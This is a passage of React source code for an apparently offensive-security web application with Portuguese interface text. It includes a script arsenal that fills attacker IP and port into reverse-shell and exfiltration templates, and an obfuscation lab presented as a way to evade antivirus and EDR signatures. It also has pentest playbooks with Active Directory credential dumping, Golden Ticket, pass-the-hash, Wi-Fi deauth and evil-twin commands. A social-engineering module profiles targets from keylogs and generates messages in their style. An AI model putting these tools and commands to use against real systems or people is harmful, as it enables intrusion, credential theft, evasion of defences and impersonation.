  "Systemd Service:bash": { level: 3, text: "Criação de serviço gera logs. ExecStart com reverse shell é detectável." },
  "Registry Run Key (Win):powershell": { level: 3, text: "Sysmon Event ID 13 monitora Run keys. Vetor altamente monitorado." },
  "Scheduled Task (Win):powershell": { level: 3, text: "Event ID 4698 loga criação. Task como SYSTEM é altamente suspeita." },
  "PSExec:bash": { level: 4, text: "Service creation remota (Event ID 7045). Assinado por todo EDR. Pattern clássico." },
  "WMIExec:bash": { level: 2, text: "WMI é legítimo. Não cria serviço — mais furtivo que PSExec." },
  "Evil-WinRM:bash": { level: 2, text: "WinRM é serviço legítimo do Windows. Menos assinado que PSExec." },
  "Pass the Hash:bash": { level: 3, text: "NTLM auth com hash detectado por EDR avançado. Event ID 4624 tipo 3." },
  "SMB Client:bash": { level: 1, text: "Acesso SMB é rotineiro em redes Windows. Indistinguível de uso legítimo." },
  "RDP:bash": { level: 1, text: "RDP é ferramenta legítima de admin. Logado mas extremamente comum." },
  "Python HTTP Server:bash": { level: 1, text: "Roda na atacante. Alvo faz GET HTTP normal — indistinguível de tráfego web." },
  "Netcat File Transfer:bash": { level: 2, text: "Conexão TCP em porta não-padrão. Detectável por NIDS e firewall rules." },
  "SCP Transfer:bash": { level: 1, text: "SSH é criptografado e legítimo. Conteúdo não inspecionável por NIDS." },
  "Certutil Download (Win):cmd": { level: 3, text: "LOLBin assinado. Defender gera alerta imediato em certutil -urlcache." },
  "PowerShell Download:powershell": { level: 3, text: "IWR e WebClient monitorados por AMSI e ScriptBlock Logging." },
  "Base64 Encode/Exfil:bash": { level: 2, text: "Encoding de arquivos sensíveis + nc é pattern de exfiltração. DLP detecta." },
  "OpenSSL Encrypted Shell:bash": { level: 2, text: "Estática: mkfifo pattern conhecida. Comportamental: shell spawn detectável. Rede: canal TLS criptografado — NIDS não vê conteúdo." },
  "SSH Reverse Tunnel:bash": { level: 1, text: "Estática: sem assinatura (ssh legítimo). Comportamental: processo ssh é rotina de admin. Rede: criptografado e indistinguível de uso legítimo." },
  "DNS Exfiltration:python": { level: 1, text: "Estática: script genérico. Comportamental: DNS queries parecem legítimas. Fraqueza: volume alto e subdomínios longos são anômalos em DNS analytics." },
  "HTTPS Beacon + Jitter:bash": { level: 1, text: "Estática: curl é legítimo. Comportamental: HTTPS + jitter parece tráfego normal. Fraqueza: threat intel de domínio + beacon frequency analysis." },
  "Process Masquerading:bash": { level: 2, text: "Estática: sem assinatura. Comportamental: argv[0] falso engana ps/top mas EDR checa /proc/pid/exe — binário real é revelado." },
  "ICMP Data Channel:python": { level: 1, text: "Estática: raw sockets requerem root (flag). Comportamental: ICMP é legítimo. Fraqueza: payloads ICMP grandes/frequentes são anômalos." },
  "Fileless via stdin:bash": { level: 2, text: "Estática: sem arquivo no disco para AV escanear. Comportamental: curl|python é pattern conhecido. EDR com memory scan (Kaspersky) detecta payload em memória." },
};

function ScriptArsenal() {
  const [cat, setCat] = useState("revshell");
  const [lhost, setLhost] = useState("10.10.10.1");
  const [lport, setLport] = useState("4444");
  const [copied, setCopied] = useState(null);
  const [search, setSearch] = useState("");
  const [expandedScript, setExpandedScript] = useState(null);
  const [subTab, setSubTab] = useState("arsenal");
  const [obfInput, setObfInput] = useState("");
  const [obfResults, setObfResults] = useState([]);

  const category = SCRIPT_CATEGORIES.find(c => c.id === cat);
  const filtered = category ? category.templates.filter(t => !search || t.name.toLowerCase().includes(search.toLowerCase()) || t.lang.toLowerCase().includes(search.toLowerCase())) : [];

  const copy = (text, name) => {
    navigator.clipboard.writeText(text);
    setCopied(name);
    setTimeout(() => setCopied(null), 2000);
  };

  const runObfuscation = () => {
    if (!obfInput.trim()) return;
    const results = [
      obfuscate.base64(obfInput),
      obfuscate.hex(obfInput),
      obfuscate.rev(obfInput),
      obfuscate.xor(obfInput),
    ];
    try { results.push(obfuscate.base64ps(obfInput)); } catch {}
    try { results.push(obfuscate.charcode(obfInput)); } catch {}
    setObfResults(results);
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.scripts.title} icon={SECTION_INFO.scripts.icon}>{SECTION_INFO.scripts.content}</InfoBox>

      <div className="flex gap-1 mb-4 border-b border-cyber-border">
        <button onClick={() => setSubTab("arsenal")} className={`px-3 py-2 text-[11px] font-mono border-b-2 cursor-pointer bg-transparent ${subTab === "arsenal" ? "border-cyber-accent text-cyber-accent" : "border-transparent text-cyber-muted"}`}> Arsenal</button>
        <button onClick={() => setSubTab("obfuscation")} className={`px-3 py-2 text-[11px] font-mono border-b-2 cursor-pointer bg-transparent ${subTab === "obfuscation" ? "border-cyber-accent text-cyber-accent" : "border-transparent text-cyber-muted"}`}> Obfuscation Lab</button>
      </div>

      {subTab === "obfuscation" && (
        <div>
          <InfoBox title="O que é Obfuscation?" icon="" color="#a855f7">
            <p><b>Obfuscation (ofuscação)</b> transforma um comando legível em uma versão codificada que faz a mesma coisa mas não é reconhecida por assinaturas de AV/EDR.</p>
            <p><b>Por que funciona?</b> Antivírus usam pattern matching (assinaturas) pra detectar comandos maliciosos conhecidos. Se o comando está encodado, a assinatura não bate.</p>
            <p><b>Métodos disponíveis:</b></p>
            <p>• <b>Base64</b> — codifica em base64, decodifica e executa via pipe. O mais usado.</p>
            <p>• <b>Hex → Python</b> — converte pra hexadecimal, decodifica em Python.</p>
            <p>• <b>Reversed</b> — inverte a string, usa 'rev' pra desinverter e executa.</p>
            <p>• <b>XOR</b> — aplica XOR com chave aleatória. Cada geração produz output diferente.</p>
            <p>• <b>CharCode (PS)</b> — converte pra char codes numéricos, remonta e executa via IEX.</p>
            <p>• <b>EncodedCommand (PS)</b> — usa o flag nativo -EncodedCommand do PowerShell (UTF-16LE base64).</p>
            <p><b>Limitação:</b> ofuscação evade assinaturas estáticas, mas NÃO evade análise comportamental (o que o comando FAZ após decodificar).</p>
          </InfoBox>

          <div className={CARD + " mb-4"}>
            <label className={LABEL}>Cole qualquer comando para gerar variantes ofuscadas:</label>
            <textarea className={`${INPUT} h-20 resize-none font-mono text-[11px]`} placeholder="Ex: whoami ou qualquer comando que você queira encodar..." value={obfInput} onChange={e => setObfInput(e.target.value)} />
            <button onClick={runObfuscation} className={`${BTN} mt-2`}> GERAR VARIANTES OFUSCADAS</button>
          </div>

          {obfResults.length > 0 && (
            <div className="space-y-3">
              {obfResults.map((r, i) => (
                <div key={i} className={CARD}>
                  <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center gap-2">
                      <span className="text-[12px] font-bold text-cyber-text">{r.label}</span>
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-[#1a1a2e] text-purple-400 border border-purple-400/40 font-mono">{r.lang}</span>
                    </div>
                    <button onClick={() => copy(r.code, r.label)} className={`${BTN} text-[10px] px-2 py-1 ${copied === r.label ? "!bg-[#22c55e]" : ""}`}>
                      {copied === r.label ? "COPIADO " : "COPIAR"}
                    </button>
                  </div>
                  <pre className="bg-black/50 rounded p-3 text-[11px] font-mono text-purple-400 overflow-x-auto whitespace-pre-wrap break-all leading-relaxed">{r.code}</pre>
                  <div className="text-[10px] text-cyber-muted mt-1">Decodifica para: <span className="text-cyber-accent">{r.decoded.slice(0, 80)}{r.decoded.length > 80 ? "..." : ""}</span></div>
                </div>
              ))}
            </div>
          )}

          {obfResults.length === 0 && (
            <div className={`${CARD} text-center py-8 text-cyber-muted`}>
              <div className="text-2xl mb-2"></div>
              <div className="text-xs">Cole um comando acima e clique Gerar para criar variantes ofuscadas</div>
            </div>
          )}
        </div>
      )}

      {subTab === "arsenal" && (
        <div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
            <div>
              <label className={LABEL}>LHOST (seu IP de atacante)</label>
              <input className={INPUT} value={lhost} onChange={e => setLhost(e.target.value)} placeholder="10.10.10.1" />
            </div>
            <div>
              <label className={LABEL}>LPORT (porta do listener)</label>
              <input className={INPUT} value={lport} onChange={e => setLport(e.target.value)} placeholder="4444" />
            </div>
          </div>

          <div className="flex flex-wrap gap-1.5 mb-4">
            {SCRIPT_CATEGORIES.map(c => (
              <button key={c.id} onClick={() => { setCat(c.id); setExpandedScript(null); }} className={`text-[10px] px-2.5 py-1.5 rounded font-mono border cursor-pointer transition-colors ${cat === c.id ? "bg-cyber-accent text-white border-cyber-accent" : "bg-transparent text-cyber-muted border-cyber-border hover:border-cyber-accent/40"}`}>
                {c.icon} {c.label}
              </button>
            ))}
          </div>

          <div className="mb-4">
            <input className={INPUT} placeholder=" Filtrar scripts..." value={search} onChange={e => setSearch(e.target.value)} />
          </div>

          {category && (
            <div className={`${CARD} mb-4 border-l-[3px] border-l-cyber-accent`}>
              <div className="text-[12px] text-cyber-text mb-1">{category.desc}</div>
              {category.detection && <div className="text-[11px] text-amber-400/80 mt-1">{category.detection}</div>}
              {category.mitre && <div className="text-[10px] text-indigo-400 mt-1 font-mono">MITRE: {category.mitre}</div>}
            </div>
          )}

          <div className="space-y-3">
            {filtered.map(t => {
              const code = t.code(lhost, lport);
              const isExpanded = expandedScript === t.name;
              const detectInfo = DETECT_INFO[`${t.name}:${t.lang}`];
              const detectBadge = detectInfo ? DETECT_BADGE[detectInfo.level] : null;
              return (
                <div key={t.name} className={CARD}>
                  <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center gap-2">
                      <button onClick={() => setExpandedScript(isExpanded ? null : t.name)} className="text-[11px] text-cyber-muted cursor-pointer bg-transparent border-none p-0">{isExpanded ? "" : ""}</button>
                      <span className="text-[12px] font-bold text-cyber-text">{t.name}</span>
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 font-mono">{t.lang}</span>
                      {detectBadge && <span className={`text-[9px] px-1.5 py-0.5 rounded bg-[#1a1a2e] border font-mono ${detectBadge.cls}`} title={detectInfo.text}>{detectBadge.icon} {detectBadge.label}</span>}
                    </div>
                    <div className="flex gap-1.5">
                      <button onClick={() => { setObfInput(code); setSubTab("obfuscation"); runObfuscation(); }} className={`${BTN_GHOST} text-[9px] px-1.5 py-0.5 text-purple-400 border-purple-400/40`} title="Ofuscar este comando"></button>
                      <button onClick={() => copy(code, t.name)} className={`${BTN} text-[10px] px-2 py-1 ${copied === t.name ? "!bg-[#22c55e]" : ""}`}>
                        {copied === t.name ? "" : "COPIAR"}
                      </button>
                    </div>
                  </div>

                  {isExpanded && (
                    <div className="mb-3 p-3 rounded-lg bg-[#0a1a2e] border border-blue-500/20 space-y-2">
                      <div className="text-[11px]"><span className="text-blue-400 font-bold">O que faz:</span> <span className="text-cyber-text/80">{t.what}</span></div>
                      <div className="text-[11px]"><span className="text-green-400 font-bold">Como usar:</span> <pre className="text-cyber-text/80 whitespace-pre-wrap mt-0.5 font-mono text-[10px] leading-relaxed">{t.how}</pre></div>
                      <div className="text-[11px]"><span className="text-amber-400 font-bold">Por que funciona:</span> <span className="text-cyber-text/80">{t.why}</span></div>
                      <div className="text-[11px]"><span className="text-purple-400 font-bold">Pré-requisitos:</span> <span className="text-cyber-text/80">{t.prereq}</span></div>
                      {detectBadge && <div className="text-[11px]"><span className="text-amber-400 font-bold"> Detectabilidade:</span> <span className="text-cyber-text/80">{detectBadge.icon} {detectBadge.label} — {detectInfo.text}</span></div>}
                    </div>
                  )}

                  <pre className="bg-black/50 rounded p-3 text-[11px] font-mono text-cyber-accent overflow-x-auto whitespace-pre-wrap break-all leading-relaxed">{code}</pre>
                </div>
              );
            })}
          </div>

          {filtered.length === 0 && (
            <div className={`${CARD} text-center py-8 text-cyber-muted`}>
              <div className="text-2xl mb-2"></div>
              <div className="text-xs">Nenhum script encontrado</div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Pentest Playbooks ────────────────────────────────────────────────────
const PLAYBOOKS = [
  {
    id: "external",
    name: "External Pentest",
    desc: "Teste de penetração externo — da internet até o primeiro acesso",
    icon: "-",
    phases: [
      {
        phase: "Reconhecimento Passivo",
        tactic: "Reconnaissance",
        mitreIds: ["T1589", "T1590", "T1593"],
        steps: [
          { cmd: "whois ALVO.com", tool: "whois", desc: "Info de registro do domínio" },
          { cmd: "dig ALVO.com ANY +noall +answer", tool: "dig", desc: "Registros DNS" },
          { cmd: "subfinder -d ALVO.com -o subs.txt", tool: "subfinder", desc: "Enumeração de subdomínios" },
          { cmd: "amass enum -passive -d ALVO.com", tool: "amass", desc: "Enumeração passiva OSINT" },
          { cmd: "theHarvester -d ALVO.com -b all", tool: "theHarvester", desc: "Coleta de e-mails e hosts" },
          { cmd: 'shodan search "ssl.cert.subject.cn:ALVO.com"', tool: "Shodan", desc: "Assets expostos na internet" },
        ],
      },
      {
        phase: "Reconhecimento Ativo",
        tactic: "Reconnaissance",
        mitreIds: ["T1595"],
        steps: [
          { cmd: "nmap -sC -sV -oN scan.txt ALVO.com", tool: "nmap", desc: "Scan de portas + versões + scripts" },
          { cmd: "nmap -sU --top-ports 50 ALVO.com", tool: "nmap", desc: "Scan UDP top 50 portas" },
          { cmd: "nikto -h https://ALVO.com", tool: "nikto", desc: "Scanner de vulnerabilidades web" },
          { cmd: "gobuster dir -u https://ALVO.com -w /usr/share/wordlists/dirb/common.txt", tool: "gobuster", desc: "Brute-force de diretórios" },
          { cmd: "wpscan --url https://ALVO.com --enumerate vp,u", tool: "wpscan", desc: "Scan WordPress (se aplicável)" },
        ],
      },
      {
        phase: "Acesso Inicial",
        tactic: "Initial Access",
        mitreIds: ["T1190", "T1078"],
        steps: [
          { cmd: "searchsploit [serviço/versão]", tool: "searchsploit", desc: "Buscar exploits conhecidos para versões encontradas" },
          { cmd: "hydra -l admin -P rockyou.txt ALVO.com ssh", tool: "hydra", desc: "Brute-force de credenciais" },
          { cmd: "sqlmap -u 'https://ALVO.com/page?id=1' --batch", tool: "sqlmap", desc: "Teste de SQL Injection" },
          { cmd: "nuclei -u https://ALVO.com -t cves/", tool: "nuclei", desc: "Scan automatizado de CVEs" },
        ],
      },
      {
        phase: "Pós-Exploração",
        tactic: "Execution",
        mitreIds: ["T1059"],
        steps: [
          { cmd: "whoami && id && hostname", tool: "shell", desc: "Confirmar acesso e privilégios" },
          { cmd: "uname -a && cat /etc/os-release", tool: "shell", desc: "Identificar sistema operacional" },
          { cmd: "sudo -l", tool: "shell", desc: "Verificar permissões sudo" },
          { cmd: "find / -perm -4000 2>/dev/null", tool: "shell", desc: "Buscar binários SUID" },
        ],
      },
    ],
  },
  {
    id: "internal",
    name: "Internal Pentest",
    desc: "Teste interno — da rede local até Domain Admin",
    icon: "-",
    phases: [
      {
        phase: "Discovery da Rede",
        tactic: "Discovery",
        mitreIds: ["T1046", "T1018"],
        steps: [
          { cmd: "nmap -sn 192.168.1.0/24", tool: "nmap", desc: "Host discovery - ping sweep" },
          { cmd: "arp-scan -l", tool: "arp-scan", desc: "ARP scan da rede local" },
          { cmd: "nbtscan 192.168.1.0/24", tool: "nbtscan", desc: "NetBIOS scan" },
          { cmd: "crackmapexec smb 192.168.1.0/24", tool: "CME", desc: "Enumerar hosts SMB + domínios" },
          { cmd: "responder -I eth0 -wrf", tool: "Responder", desc: "Capturar hashes NTLM (LLMNR/NBT-NS)" },
        ],
      },
      {
        phase: "Enumeração AD",
        tactic: "Discovery",
        mitreIds: ["T1087", "T1069"],
        steps: [
          { cmd: "enum4linux -a DC_IP", tool: "enum4linux", desc: "Enumeração completa SMB/AD" },
          { cmd: "ldapsearch -x -H ldap://DC_IP -b 'dc=DOMAIN,dc=local'", tool: "ldapsearch", desc: "Query LDAP anônima" },
          { cmd: "kerbrute userenum --dc DC_IP -d DOMAIN users.txt", tool: "kerbrute", desc: "Enumeração de users via Kerberos" },
          { cmd: "bloodhound-python -d DOMAIN -u USER -p PASS -ns DC_IP -c all", tool: "BloodHound", desc: "Coleta de dados AD para BloodHound" },
          { cmd: "GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat", tool: "impacket", desc: "AS-REP Roasting" },
        ],
      },
      {
        phase: "Credential Access",
        tactic: "Credential Access",
        mitreIds: ["T1558", "T1003"],
        steps: [
          { cmd: "GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request", tool: "impacket", desc: "Kerberoasting" },
          { cmd: "hashcat -m 13100 hashes.txt rockyou.txt", tool: "hashcat", desc: "Crack hashes Kerberoast" },
          { cmd: "secretsdump.py DOMAIN/user:pass@TARGET_IP", tool: "impacket", desc: "Dump de hashes SAM/NTDS" },
          { cmd: "crackmapexec smb TARGET_IP -u user -p pass --lsa", tool: "CME", desc: "Dump LSA secrets" },
        ],
      },
      {
        phase: "Lateral Movement",
        tactic: "Lateral Movement",
        mitreIds: ["T1021"],
        steps: [
          { cmd: "psexec.py DOMAIN/user:pass@TARGET_IP", tool: "impacket", desc: "Shell via PsExec" },
          { cmd: "evil-winrm -i TARGET_IP -u user -p pass", tool: "evil-winrm", desc: "Shell via WinRM" },
          { cmd: "xfreerdp /v:TARGET_IP /u:user /p:pass /dynamic-resolution", tool: "xfreerdp", desc: "RDP" },
          { cmd: "crackmapexec smb SUBNET -u user -H HASH --local-auth", tool: "CME", desc: "Pass-the-Hash em massa" },
        ],
      },
      {
        phase: "Domain Admin",
        tactic: "Privilege Escalation",
        mitreIds: ["T1078.002"],
        steps: [
          { cmd: "secretsdump.py DOMAIN/admin:pass@DC_IP", tool: "impacket", desc: "DCSync - dump NTDS.dit" },
          { cmd: "ticketer.py -nthash KRBTGT_HASH -domain DOMAIN -domain-sid S-1-5-21-... -spn krbtgt/DOMAIN administrator", tool: "impacket", desc: "Golden Ticket" },
          { cmd: "wmiexec.py -hashes :HASH DOMAIN/administrator@DC_IP", tool: "impacket", desc: "Acesso ao DC via WMI" },
        ],
      },
    ],
  },
  {
    id: "webapp",
    name: "Web App Pentest",
    desc: "Teste de aplicação web — OWASP Top 10",
    icon: "-",
    phases: [
      {
        phase: "Reconnaissance",
        tactic: "Reconnaissance",
        mitreIds: ["T1595"],
        steps: [
          { cmd: "whatweb https://ALVO.com", tool: "whatweb", desc: "Fingerprint de tecnologias" },
          { cmd: "wappalyzer (browser extension)", tool: "wappalyzer", desc: "Stack tecnológico" },
          { cmd: "gobuster dir -u URL -w wordlist.txt -x php,html,js", tool: "gobuster", desc: "Brute-force de diretórios e arquivos" },
          { cmd: "ffuf -u URL/FUZZ -w wordlist.txt -mc 200,301,302", tool: "ffuf", desc: "Fuzzing de endpoints" },
        ],
      },
      {
        phase: "Injection",
        tactic: "Initial Access",
        mitreIds: ["T1190"],
        steps: [
          { cmd: "sqlmap -u 'URL?param=1' --batch --dbs", tool: "sqlmap", desc: "SQL Injection automatizado" },
          { cmd: "Burp Suite → Intruder → XSS payloads", tool: "Burp Suite", desc: "Cross-Site Scripting (XSS)" },
          { cmd: 'curl URL -d \'{"__proto__":{"admin":true}}\'', tool: "curl", desc: "Prototype Pollution test" },
          { cmd: "commix --url='URL?param=test'", tool: "commix", desc: "Command Injection" },
        ],
      },
      {
        phase: "Auth & Session",
        tactic: "Credential Access",
        mitreIds: ["T1110"],
        steps: [
          { cmd: "hydra -l admin -P rockyou.txt URL http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", tool: "hydra", desc: "Brute-force de login" },
          { cmd: "jwt_tool TOKEN", tool: "jwt_tool", desc: "Análise de JWT tokens" },
          { cmd: "Burp Suite → Session handling rules", tool: "Burp Suite", desc: "Session fixation/hijacking tests" },
        ],
      },
      {
        phase: "File & Config",
        tactic: "Collection",
        mitreIds: ["T1005"],
        steps: [
          { cmd: "curl URL/../../etc/passwd", tool: "curl", desc: "Path Traversal / LFI" },
          { cmd: "curl URL/upload -F 'file=@shell.php'", tool: "curl", desc: "Unrestricted File Upload" },
          { cmd: "curl -X OPTIONS URL -v", tool: "curl", desc: "Verificar métodos HTTP permitidos" },
          { cmd: "curl URL/.git/HEAD", tool: "curl", desc: "Exposed .git directory" },
        ],
      },
    ],
  },
  {
    id: "wireless",
    name: "Wireless Pentest",
    desc: "Teste de redes Wi-Fi — WPA/WPA2/WPA3",
    icon: "-",
    phases: [
      {
        phase: "Preparação",
        tactic: "Resource Development",
        mitreIds: ["T1583"],
        steps: [
          { cmd: "airmon-ng check kill", tool: "aircrack", desc: "Matar processos que interferem" },
          { cmd: "airmon-ng start wlan0", tool: "aircrack", desc: "Modo monitor" },
          { cmd: "airodump-ng wlan0mon", tool: "aircrack", desc: "Scan de redes Wi-Fi" },
        ],
      },
      {
        phase: "Captura de Handshake",
        tactic: "Credential Access",
        mitreIds: ["T1557"],
        steps: [
          { cmd: "airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon", tool: "aircrack", desc: "Capturar tráfego do AP alvo" },
          { cmd: "aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon", tool: "aircrack", desc: "Deauth para forçar reconexão" },
          { cmd: "aircrack-ng -w rockyou.txt capture-01.cap", tool: "aircrack", desc: "Crack do handshake WPA" },
          { cmd: "hashcat -m 22000 capture.hc22000 rockyou.txt", tool: "hashcat", desc: "Crack com GPU (mais rápido)" },
        ],
      },
      {
        phase: "Evil Twin",
        tactic: "Initial Access",
        mitreIds: ["T1557"],
        steps: [
          { cmd: "hostapd-mana hostapd.conf", tool: "hostapd-mana", desc: "Criar AP falso" },
          { cmd: "dnsmasq -C dnsmasq.conf", tool: "dnsmasq", desc: "DHCP + DNS para evil twin" },
          { cmd: "wifiphisher -aI wlan0 -eI wlan1", tool: "wifiphisher", desc: "Phishing via evil twin automatizado" },
        ],
      },
    ],
  },
];

function PentestPlaybooks() {
  const [activeBook, setActiveBook] = useState(null);
  const [checked, setChecked] = useState({});
  const [copied, setCopied] = useState(null);
  const [notes, setNotes] = useState({});

  const toggle = (key) => setChecked(c => ({ ...c, [key]: !c[key] }));
  const copy = (text, key) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  };

  const book = PLAYBOOKS.find(p => p.id === activeBook);

  if (!book) {
    return (
      <div>
        <InfoBox title={SECTION_INFO.playbooks.title} icon={SECTION_INFO.playbooks.icon}>{SECTION_INFO.playbooks.content}</InfoBox>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {PLAYBOOKS.map(p => {
            const totalSteps = p.phases.reduce((sum, ph) => sum + ph.steps.length, 0);
            const doneSteps = p.phases.reduce((sum, ph) => sum + ph.steps.filter((_, i) => checked[`${p.id}-${ph.phase}-${i}`]).length, 0);
            return (
              <div key={p.id} className={`${CARD} cursor-pointer hover:border-cyber-accent/40 transition-colors`} onClick={() => setActiveBook(p.id)}>
                <div className="text-2xl mb-2">{p.icon}</div>
                <div className="text-[14px] font-bold text-cyber-text mb-1">{p.name}</div>
                <div className="text-[11px] text-cyber-muted mb-3">{p.desc}</div>
                <div className="flex justify-between items-center">
                  <span className="text-[10px] text-cyber-muted">{p.phases.length} fases · {totalSteps} passos</span>
                  {doneSteps > 0 && (
                    <span className="text-[10px] text-cyber-accent font-mono">{doneSteps}/{totalSteps}</span>
                  )}
                </div>
                {doneSteps > 0 && (
                  <div className="h-1.5 bg-cyber-border rounded-full mt-2 overflow-hidden">
                    <div className="h-full bg-cyber-accent rounded-full transition-all" style={{ width: `${(doneSteps / totalSteps) * 100}%` }} />
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    );
  }

  const totalSteps = book.phases.reduce((sum, ph) => sum + ph.steps.length, 0);
  const doneSteps = book.phases.reduce((sum, ph) => sum + ph.steps.filter((_, i) => checked[`${book.id}-${ph.phase}-${i}`]).length, 0);

  return (
    <div>
      <div className="flex items-center gap-3 mb-4">
        <button onClick={() => setActiveBook(null)} className={BTN_GHOST}>← Voltar</button>
        <div className="flex-1">
          <div className="text-[14px] font-bold text-cyber-text">{book.icon} {book.name}</div>
          <div className="text-[10px] text-cyber-muted">{doneSteps}/{totalSteps} passos completos</div>
        </div>
      </div>

      <div className="h-2 bg-cyber-border rounded-full overflow-hidden mb-4">
        <div className="h-full bg-cyber-accent rounded-full transition-all" style={{ width: `${(doneSteps / totalSteps) * 100}%` }} />
      </div>

      {book.phases.map((phase, pi) => {
        const phaseDone = phase.steps.filter((_, i) => checked[`${book.id}-${phase.phase}-${i}`]).length;
        return (
          <div key={pi} className={`${CARD} mb-3`}>
            <div className="flex items-center justify-between mb-3">
              <div>
                <div className="text-[13px] font-bold text-cyber-text">{phase.phase}</div>
                <div className="flex gap-2 mt-1 flex-wrap">
                  <span className="text-[9px] px-1.5 py-0.5 rounded font-mono" style={{ background: TACTIC_COLORS[phase.tactic] + "22", color: TACTIC_COLORS[phase.tactic] }}>{tacticLabel(phase.tactic)}</span>
                  {phase.mitreIds.map(id => (
                    <a key={id} href={mitreUrl(id)} target="_blank" rel="noreferrer" className="text-[9px] px-1.5 py-0.5 bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 rounded font-mono hover:underline">{id}</a>
                  ))}
                </div>
              </div>
              <span className="text-[10px] text-cyber-muted font-mono">{phaseDone}/{phase.steps.length}</span>
            </div>

            <div className="space-y-2">
              {phase.steps.map((step, si) => {
                const key = `${book.id}-${phase.phase}-${si}`;
                const done = checked[key];
                return (
                  <div key={si} className={`p-2.5 rounded-lg border ${done ? "border-[#22c55e]/30 bg-[#22c55e]/5" : "border-cyber-border"}`}>
                    <div className="flex items-start gap-2">
                      <button onClick={() => toggle(key)} className={`mt-0.5 w-4 h-4 rounded border flex-shrink-0 flex items-center justify-center text-[10px] cursor-pointer ${done ? "bg-[#22c55e] border-[#22c55e] text-white" : "bg-transparent border-cyber-muted text-transparent"}`}></button>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1 flex-wrap">
                          <span className={`text-[11px] ${done ? "line-through text-cyber-muted" : "text-cyber-text"}`}>{step.desc}</span>
                          <span className="text-[9px] px-1.5 py-0.5 rounded bg-purple-500/10 text-purple-400 border border-purple-400/30 font-mono">{step.tool}</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="text-[10px] font-mono text-cyber-accent bg-black/30 px-2 py-1 rounded flex-1 break-all">{step.cmd}</code>
                          <button onClick={() => copy(step.cmd, key)} className={`text-[9px] px-1.5 py-1 rounded border cursor-pointer flex-shrink-0 ${copied === key ? "bg-[#22c55e] text-white border-[#22c55e]" : "bg-transparent text-cyber-muted border-cyber-border hover:border-cyber-accent/40"}`}>
                            {copied === key ? "" : ""}
                          </button>
                        </div>
                        <textarea
                          className="mt-2 w-full bg-black/20 border border-cyber-border rounded text-[10px] text-cyber-muted p-1.5 resize-none font-mono h-6 focus:h-16 transition-all outline-none"
                          placeholder="Notas..."
                          value={notes[key] || ""}
                          onChange={e => setNotes(n => ({ ...n, [key]: e.target.value }))}
                        />
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        );
      })}
    </div>
  );
}

// ─── Social Engineering — Behavioral Analysis ───────────────────────────────
function SocialEngineering({ sliver: sliverCtx }) {
  const [activeSection, setActiveSection] = useState("analyze");
  const [profileName, setProfileName] = useState("alvo-1");
  const [textSamples, setTextSamples] = useState("");
  const [rawKeylog, setRawKeylog] = useState("");
  const [profile, setProfile] = useState(null);
  const [profiles, setProfiles] = useState([]);
  const [genContext, setGenContext] = useState("");
  const [genType, setGenType] = useState("email");
  const [genResult, setGenResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [collectorScript, setCollectorScript] = useState(null);

  const bridgeUrl = sliverCtx.bridgeUrl;
  const bridgeKey = sliverCtx.bridgeKey;

  const apiFetch = useCallback(async (path, opts = {}) => {
    const res = await fetch(`${bridgeUrl}${path}`, {
      ...opts,
      headers: { "Content-Type": "application/json", "X-Bridge-Api-Key": bridgeKey, ...opts.headers },
    });
    if (!res.ok) {
      const body = await res.text().catch(() => "");
      throw new Error(body || `HTTP ${res.status}`);
    }
    return res.json();
  }, [bridgeUrl, bridgeKey]);

  const loadProfiles = useCallback(async () => {
    try {
      const data = await apiFetch("/social/profiles");
      setProfiles(data.profiles || []);
    } catch {}
  }, [apiFetch]);

  useEffect(() => { loadProfiles(); }, [loadProfiles]);

  const analyze = async () => {
    setLoading(true); setError(null);
    try {
      const samples = textSamples.split("\n---\n").filter(s => s.trim());
      const data = await apiFetch("/social/analyze", {
        method: "POST",
        body: JSON.stringify({ profile_name: profileName, text_samples: samples, raw_keylog: rawKeylog }),
      });
      setProfile(data);
      await loadProfiles();
    } catch (err) { setError(err.message); }
    finally { setLoading(false); }
  };

  const generate = async () => {
    setLoading(true); setError(null);
    try {
      const data = await apiFetch("/social/generate", {
        method: "POST",
        body: JSON.stringify({ profile_name: profileName, context: genContext, message_type: genType }),
      });
      setGenResult(data.message);
    } catch (err) { setError(err.message); }
    finally { setLoading(false); }
  };

  const loadCollectorScript = async () => {
    try {
      const resp = await fetch("/tools/collector.ps1");
      if (resp.ok) setCollectorScript(await resp.text());
    } catch {}
  };

  const sections = [
    { id: "analyze", label: " Analisar", desc: "Criar perfil comportamental" },
    { id: "generate", label: " Gerar", desc: "Gerar texto no estilo do alvo" },
    { id: "profiles", label: " Perfis", desc: "Perfis salvos" },
    { id: "collector", label: " Coletor", desc: "Deploy do coletor na VM" },
  ];

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {sections.map(s => (
          <button key={s.id} onClick={() => setActiveSection(s.id)}
            className={`px-3 py-1.5 rounded text-xs font-mono border transition-colors ${
              activeSection === s.id
                ? "bg-purple-500/20 border-purple-500/50 text-purple-400"
                : "bg-cyber-surface border-cyber-border text-cyber-muted hover:text-cyber-text hover:bg-white/5"
            }`}>
            {s.label}
          </button>
        ))}
      </div>

      {error && <div className="bg-red-500/10 border border-red-500/30 rounded px-3 py-2 text-xs text-red-400">{error}</div>}

      {/* ── ANALISAR ────────────────────────────────────────────────── */}
      {activeSection === "analyze" && (
